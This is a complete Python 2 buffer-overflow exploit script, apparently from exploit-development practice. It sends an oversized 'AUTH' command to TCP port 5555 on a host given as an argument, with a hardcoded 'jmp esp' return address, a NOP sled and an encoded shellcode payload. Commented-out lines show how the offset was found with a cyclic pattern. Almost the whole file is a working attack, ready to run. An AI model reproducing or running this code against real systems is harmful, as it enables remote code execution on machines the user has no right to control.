#!/usr/bin/python
import time, struct, sys
import socket as so


#pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6B"
shellcode = ("\xbd\xca\x9e\x87\x0c\xda\xc5\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x52\x83\xc7\x04\x31\x6f\x0e\x03\xa5\x90\x65\xf9\xc5\x45\xeb"
"\x02\x35\x96\x8c\x8b\xd0\xa7\x8c\xe8\x91\x98\x3c\x7a\xf7\x14"
"\xb6\x2e\xe3\xaf\xba\xe6\x04\x07\x70\xd1\x2b\x98\x29\x21\x2a"
"\x1a\x30\x76\x8c\x23\xfb\x8b\xcd\x64\xe6\x66\x9f\x3d\x6c\xd4"
"\x0f\x49\x38\xe5\xa4\x01\xac\x6d\x59\xd1\xcf\x5c\xcc\x69\x96"
"\x7e\xef\xbe\xa2\x36\xf7\xa3\x8f\x81\x8c\x10\x7b\x10\x44\x69"
"\x84\xbf\xa9\x45\x77\xc1\xee\x62\x68\xb4\x06\x91\x15\xcf\xdd"
"\xeb\xc1\x5a\xc5\x4c\x81\xfd\x21\x6c\x46\x9b\xa2\x62\x23\xef"
"\xec\x66\xb2\x3c\x87\x93\x3f\xc3\x47\x12\x7b\xe0\x43\x7e\xdf"
"\x89\xd2\xda\x8e\xb6\x04\x85\x6f\x13\x4f\x28\x7b\x2e\x12\x25"
"\x48\x03\xac\xb5\xc6\x14\xdf\x87\x49\x8f\x77\xa4\x02\x09\x80"
"\xcb\x38\xed\x1e\x32\xc3\x0e\x37\xf1\x97\x5e\x2f\xd0\x97\x34"
"\xaf\xdd\x4d\x9a\xff\x71\x3e\x5b\xaf\x31\xee\x33\xa5\xbd\xd1"
"\x24\xc6\x17\x7a\xce\x3d\xf0\x8f\x04\x3d\x25\xf8\x18\x3d\x24"
"\x43\x95\xdb\x4c\xa3\xf0\x74\xf9\x5a\x59\x0e\x98\xa3\x77\x6b"
"\x9a\x28\x74\x8c\x55\xd9\xf1\x9e\x02\x29\x4c\xfc\x85\x36\x7a"
"\x68\x49\xa4\xe1\x68\x04\xd5\xbd\x3f\x41\x2b\xb4\xd5\x7f\x12"
"\x6e\xcb\x7d\xc2\x49\x4f\x5a\x37\x57\x4e\x2f\x03\x73\x40\xe9"
"\x8c\x3f\x34\xa5\xda\xe9\xe2\x03\xb5\x5b\x5c\xda\x6a\x32\x08"
"\x9b\x40\x85\x4e\xa4\x8c\x73\xae\x15\x79\xc2\xd1\x9a\xed\xc2"
"\xaa\xc6\x8d\x2d\x61\x43\xad\xcf\xa3\xbe\x46\x56\x26\x03\x0b"
"\x69\x9d\x40\x32\xea\x17\x39\xc1\xf2\x52\x3c\x8d\xb4\x8f\x4c"
"\x9e\x50\xaf\xe3\x9f\x70")


try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

#req1 = "AUTH " + "\x41"*1040 + "\x42"* 4 + "\x43" * 28
#req1  = "AUTH " + pattern
#65D11D71 (jmp esp)
#req1 = "AUTH " + "A"*1040 + "\x71\x1d\xd1\x65" + "C" * 28
req1 = "AUTH " + "A"*1040 + "\x71\x1d\xd1\x65" + "\x90" * 16 + shellcode


s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
